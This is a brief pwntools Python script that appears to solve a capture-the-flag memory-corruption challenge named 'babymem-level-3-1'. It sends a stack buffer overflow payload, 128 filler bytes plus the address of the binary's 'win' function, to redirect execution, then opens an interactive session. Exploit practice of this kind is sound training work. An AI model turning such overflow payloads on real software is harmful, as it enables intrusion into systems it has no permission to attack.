from pwn import *

elf = ELF("/challenge/babymem-level-3-1")

p = elf.process()

p.sendline(b"5000")

print(str(hex(elf.symbols["win"])))

payload = b"A"*128 + p64(elf.symbols["win"])
p.sendline(payload)


p.interactive()
